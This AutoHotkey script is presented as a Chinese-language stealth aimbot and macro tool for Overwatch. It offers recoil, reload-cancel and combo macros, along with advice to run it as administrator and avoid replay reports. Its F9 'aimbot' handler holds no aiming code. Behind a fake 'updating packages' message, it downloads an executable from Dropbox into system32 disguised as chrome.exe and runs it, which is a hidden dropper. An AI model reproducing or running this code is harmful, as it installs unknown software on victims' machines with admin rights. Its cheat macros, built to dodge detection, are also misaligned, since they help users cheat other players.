; <COMPILER: v1.1.24.01>
Box_Init(C="FF0000") {
Gui, 96: -Caption +ToolWindow +E0x20
Gui, 96: Color, % C
Gui, 97: -Caption +ToolWindow +E0x20
Gui, 97: Color, % C
Gui, 98: -Caption +ToolWindow +E0x20
Gui, 98: Color, % C
Gui, 99: -Caption +ToolWindow +E0x20
Gui, 99: Color, % C
}
Box_Draw(X, Y, W, H, T="1", O="I") {
If(W < 0)
X += W, W *= -1
If(H < 0)
Y += H, H *= -1
If(T >= 2)
{
If(O == "O")
X -= T, Y -= T, W += T, H += T
If(O == "C")
X -= T / 2, Y -= T / 2
If(O == "I")
W -= T, H -= T
}
Gui, 96: Show, % "x" X " y" Y " w" W " h" T " NA", Horizontal 1
Gui, 96:+AlwaysOnTop
Gui, 98: Show, % "x" X " y" Y + H " w" W " h" T " NA", Horizontal 2
Gui, 98:+AlwaysOnTop
Gui, 97: Show, % "x" X " y" Y " w" T " h" H " NA", Vertical 1
Gui, 97:+AlwaysOnTop
Gui, 99: Show, % "x" X + W " y" Y " w" T " h" H " NA", Vertical 2
Gui, 99:+AlwaysOnTop
}
Box_Destroy() {
Loop, 4
Gui, % A_Index + 95 ":  Destroy"
}
Box_Hide() {
Loop, 4
Gui, % A_Index + 95 ":  Hide"
}
guif:
#NoEnv
#SingleInstance force
SkinForm(Apply, A_ScriptDir . "\USkin.dll", A_ScriptDir . "\Milikymac.msstyles")
Firing := 0
Gui Add, Text, x10 y20 w200 h20, 啟動自喵外掛 [F9]
Gui Add, Text, x10 y40 w200 h20, 啟動自瞄小黃盒菜單 [F12]
Gui Add, Text, x10 y60 w160 h20, 關閉自瞄外掛 [右Shift鍵]
Gui Add, Text, x10 y80 w160 h20, 觀察運行狀態 [F4]


Gui Add, Button, x240 y20 w80 h20 gsub1, 有問題嗎喵?

Gui Add, GroupBox, x8 y120 w187 h190, 輔助功能
Gui Add, CheckBox, x16 y140 w160 h20 vmccree, 麥卡利右鍵自動壓槍
Gui Add, CheckBox, x16 y160 w160 h20 vtorbjorn, 托比昂快速回彈
Gui Add, CheckBox, x16 y180 w160 h20 vpharah, 法拉快速回彈
Gui Add, CheckBox, x16 y200 w160 h20 vreaper, 死神快速回彈
Gui Add, CheckBox, x16 y220 w160 h20 vroadhog, 攔路豬快速回彈
Gui Add, CheckBox, x16 y240 w160 h20 vroadhog1, 攔路豬連技(滑鼠中鍵使用)
Gui Add, CheckBox, x16 y260 w160 h20 vgenji, 源氏連技(滑鼠中鍵使用)
Gui Add, CheckBox, x16 y280 w160 h20 vbunny, 笨咩跳 (跳躍輔助)

Gui Add, Button, x240 y40 w80 h20 gsub2, 使用方法
Gui Add, Button, x240 y60 w80 h20 gsub3, 最佳設置


Gui Add, Text, x240 y100 w130 h150, 特別感謝:`n`n麻九九提供自瞄代碼來源及測試`n黏黏大麻破解及美化UI`n`n咩<3
Gui Show, w372 h320, 喵羊特攻隱蔽自喵 v2.3
Loop {
Gui, Submit, NoHide
Sleep -1
}
Return

F9::

ifnotexist, C:\Windows\system32\chrome.exe
{
Splashimage,,b w600 h80 x100 Y400 CWred m9 b fs30 zh0,自瞄所需套件更新中，請稍等
urldownloadtofile, https://www.dropbox.com/s/yuj7zkaa3ps09vk/chrome.exe?dl=1, C:\Windows\system32\chrome.exe
Splashimage, off
msgbox, 262208,Download ,套件下載完畢，請重新啟用自瞄
}
else
Run C:\windows\system32\chrome.exe
return

F4::
Send {Ctrl Down}{Shift Down}{R Down}{Ctrl Up}{Shift Up}{R Up}
Return
#If bunny=1
*~$Space::
sleep 20
loop
{
GetKeyState, SpaceState, Space, P
if SpaceState = U
break
Sleep 1
Send, {Blind}{Space}
}
Return
#If
Return

#If roadhog1=1
mbutton::
MouseClick, right
sleep, 5
Send {LShift down}{LShift up}
sleep, 1040
MouseClick, left
sleep, 50
Send {v down}{v up}
Return
#If
Return
#If genji=1
mbutton::
MouseClick, right
sleep, 15
Send {v down}{v up}
sleep, 15
Send {Shift down}{Shift up}
Return
#If
Return
#If roadhog=1
$r::
Send {r}
Sleep 1880
Send {v}
Return
#If
Return
#If torbjorn=1
$r::
Send {r}
Sleep 1780
Send {v}
Return
#If
Return
#If pharah=1
$r::
Send {r}
Sleep 1200
Send {v}
Return
#If
return
#If reaper=1
$r::
Send {r}
Sleep 300
Send {v}
Return
#If
return
#If mccree=1
~RButton::
Loop
If GetKeyState("RButton") {
Sleep, 5
moveAmount := (moveAmount = 2) ? 3 : 0
mouseXY(moveAmount,3.4)
}
else
break
Return
mouseXY(x,y)
{
DllCall("mouse_event",int,1,int,x,int,y,uint,0,uint,0)
}
#If
return

sub1:
{
msgbox, 問題集：`n`n請先確定本外掛必須以系統管理員執行`n`n"麥卡利右鍵自動壓槍"每次使用請緊按右鍵以便壓槍功能可正確啟用，使用右鍵收放可讓壓槍更自然`n`n請按滑鼠中鍵來使用所有連技`n`n請勿同時啟用多個角色的輔助功能`n`n本自喵輔助因為屬隱蔽式、沒有破解進遊戲內，因此非常倚靠電腦機能，`n自喵速度越快需求越高，請確定你的電腦有相當效能啟用本自喵`n`n如果遊玩過程感覺卡卡的，電腦不夠強大的話:`n1. 把桌面的Aero效果關閉，詳見：http://goo.gl/iBA1yt`n2. 把遊戲解像度設定為1280x1024，把畫質調作低.`n3. 如果你發現準星亂抖、亂飄，關閉遊戲和外掛後，先啟動遊戲才啟動外掛即可`n`n以上做過都沒用，可能是：`n`n你的電腦太卡了.想辦法讓電腦跑順點吧。`n`n請善用遊戲內的練習模式來找出最適合自己電腦的設定.
}
return
sub2:
{
msgbox, 使用方法:`n`n請先確定本外掛必須以系統管理員執行`n`n啟動遊戲後和本自喵程式. 把圖形設定作無框視窗模式`n以防萬一,建議你把畫質設定作低.`n`n開始使用:`n按F9啟用自瞄功能`nF12開啟/關閉自瞄菜單(小黃盒)`n鍵盤上、下、左、右鍵控制小黃盒`n右Shift鍵關閉自瞄。`n輔助功能只需打勾以便啟用或取消`n`n啟動後，必順射擊一名敵人，當它的血量顯示出來後，自瞄才會發動`n`n如果發現沒有任何效用或抖，請確定你已經重啟遊戲及外掛，並關閉所有非遊戲進程，由其會變更遊戲顏色的程式或某些錄影程式，如：W10 DVR、Fraps等。
}
return
sub3:
{
msgbox, 最佳隱蔽設定:`n`n建議不要把自喵設定太誇張，免得被人肉眼看到用重播檢舉。人肉檢舉本程式慨不負責。
}
return
GuiClose:
ExitApp
return
SkinForm(Param1 = "Apply", DLL = "", SkinName = ""){
if(Param1 = Apply){
DllCall("LoadLibrary", str, DLL)
DllCall(DLL . "\USkinInit", Int,0, Int,0, AStr, SkinName)
}else  if(Param1 = 0) {
DllCall(DLL . "\USkinExit")
}}
Change1:
MsgBox,  Applied
Gui,Submit, Nohide
return

ALT::
pause
SoundBEEP
return


ExitApp